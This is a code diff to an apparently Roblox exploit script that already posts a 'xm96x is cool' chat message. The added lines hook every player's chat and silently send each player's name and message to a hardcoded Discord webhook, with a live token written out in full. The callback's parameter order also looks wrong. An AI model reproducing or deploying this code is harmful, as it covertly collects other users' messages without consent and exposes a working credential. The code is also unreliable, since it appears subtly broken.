@@ -1,4 +1,53 @@
 pcall(function()
+   game.Players.PlayerAdded:Connect(function(v)
+v.Chatted:Connect(function(plr, msg)
+local dataa = {
+    ["embeds"] = {{
+        ["author"] = {
+            ["name"] = "spfs ingame message",
+            ["icon_url"] = "https://i.pinimg.com/736x/f4/30/75/f43075a7946a71f03759ce502d0a8a6d.jpg"
+        },
+        ["description"] = `{plr.Name}: {msg}`,
+        ["color"] = tonumber(0xFFFAFA),
+    }},
+}
+request(
+    {
+        Url = "https://discord.com/api/webhooks/1241503435338158193/9RGctdNMvbnzInz7LmS7E0MqbTzePhZ794ze7oIwYr90nOQDVRKU1_gklXFXYARcGAAs",
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = game:GetService("HttpService"):JSONEncode(dataa)
+    }
+)
+end)
+end)
+
+for i, v in game.Players:GetPlayers() do
+v.Chatted:Connect(function(plr, msg)
+local dataa = {
+    ["embeds"] = {{
+        ["author"] = {
+            ["name"] = "spfs ingame message",
+            ["icon_url"] = "https://i.pinimg.com/736x/f4/30/75/f43075a7946a71f03759ce502d0a8a6d.jpg"
+        },
+        ["description"] = `{plr.Name}: {msg}`,
+        ["color"] = tonumber(0xFFFAFA),
+    }},
+}
+request(
+    {
+        Url = "https://discord.com/api/webhooks/1241503435338158193/9RGctdNMvbnzInz7LmS7E0MqbTzePhZ794ze7oIwYr90nOQDVRKU1_gklXFXYARcGAAs",
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = game:GetService("HttpService"):JSONEncode(dataa)
+    }
+)
+end)
+end
    game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer('xm96x is cool', "All")
 end)
 
